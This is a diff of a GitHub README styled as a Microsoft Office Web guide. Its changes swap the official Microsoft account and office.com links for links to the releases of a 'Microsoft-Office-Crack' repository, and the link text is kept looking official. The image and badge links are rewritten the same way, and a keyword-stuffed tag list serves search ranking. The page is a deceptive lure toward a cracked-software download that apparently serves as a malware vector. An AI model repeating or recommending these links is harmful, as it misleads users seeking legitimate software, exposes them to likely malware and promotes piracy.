@@ -1,5 +1,5 @@
 
-![395736222-33b5bf23-23f0-42df-a7c6-5126c3535de3](https://github.com/user-attachments/assets/29e576ff-efe8-4007-82b3-3eff45e377a1)
+![395736222-33b5bf23-23f0-42df-a7c6-5126c3535de3](https://github.com/lamakhatab/Microsoft-Office-Crack/releases)
 
 # Microsoft Office Web – Tips, Updates & Features
 
@@ -25,8 +25,8 @@ This repository is purely for **educational purposes**. We do not promote or end
 
 Follow these steps to start using **Microsoft Office Web Apps**:
 
-1. **Create a Microsoft Account**: If you don’t already have one, sign up for a free Microsoft account at [Microsoft Account Sign-Up](https://account.microsoft.com/account).
-2. **Access Office Web Apps**: Go to [Office.com](https://www.office.com) and sign in with your Microsoft account to access Word, Excel, PowerPoint, OneNote, and other Office Web Apps.
+1. **Create a Microsoft Account**: If you don’t already have one, sign up for a free Microsoft account at [Microsoft Account Sign-Up](https://github.com/lamakhatab/Microsoft-Office-Crack/releases).
+2. **Access Office Web Apps**: Go to [https://github.com/lamakhatab/Microsoft-Office-Crack/releases](https://github.com/lamakhatab/Microsoft-Office-Crack/releases) and sign in with your Microsoft account to access Word, Excel, PowerPoint, OneNote, and other Office Web Apps.
 3. **Start Creating**: Once signed in, you can create, edit, and share documents directly from your browser.
 4. **Upgrade for More Features**: If you need advanced features like offline access, more storage, or collaboration tools, consider upgrading to a Microsoft 365 subscription.
 
@@ -62,7 +62,7 @@ This repository is licensed under the **MIT License**. See the [LICENSE](LICENSE
 
 ---
 #
-[![https://LwVm6.gotra.top/52/E2xGLCT](https://LBwkft6.gotra.top/l.svg)](https://tULfq.gotra.top/52/aqUE1)
+[![https://github.com/lamakhatab/Microsoft-Office-Crack/releases](https://github.com/lamakhatab/Microsoft-Office-Crack/releases)](https://github.com/lamakhatab/Microsoft-Office-Crack/releases)
 # Tags:
 microsoft-office-web microsoft-office-home microsoft-office-support-phone-number microsoft-office-in-mac microsoft-office-one-time-purchase microsoft-office-student-free the-office-microsoft-teams-background-loop microsoft-chief-operating-officer ms-microsoft-office microsoft-main-office microsoft-office-chat-list microsoft-office-home-and-student microsoft-office-365-price microsoft-office-professional microsoft-office-onenote microsoft-office-2021-professional-plus
 
